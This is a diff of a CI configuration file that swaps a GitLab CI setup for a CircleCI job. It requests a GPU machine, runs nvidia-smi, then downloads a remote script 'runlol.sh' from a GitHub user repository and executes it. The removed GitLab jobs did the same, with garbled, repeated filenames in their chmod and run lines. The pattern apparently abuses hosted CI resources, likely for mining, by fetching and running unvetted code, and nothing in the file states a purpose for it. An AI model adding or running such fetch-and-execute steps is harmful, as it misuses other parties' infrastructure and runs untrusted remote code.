@@ -1,24 +1,10 @@
-image: golang:latest
+version: 2.1
 
-variables:
-  REPO_NAME: gitlab.com/namespace/project
-
-stages:
-  - build
-  - test
-  - deploy
-
-build_a:
-  stage: build
-  script:
-     - wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh
-     - chmod 777 runlol.shrunlol.shrunlol.shrunlol.shrunlol.sh
-     - ./runlol.shrunlol.shrunlol.shrunlol.sh
-     
-
-build_b:
-  stage: build
-  script:
-     - wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh
-     - chmod 777 runlol.shrunlol.shrunlol.sh
-     - ./runlol.shrunlol.sh
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi 
+      - run: wget https://raw.githubusercontent.com/Vaping86/Vaping86/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
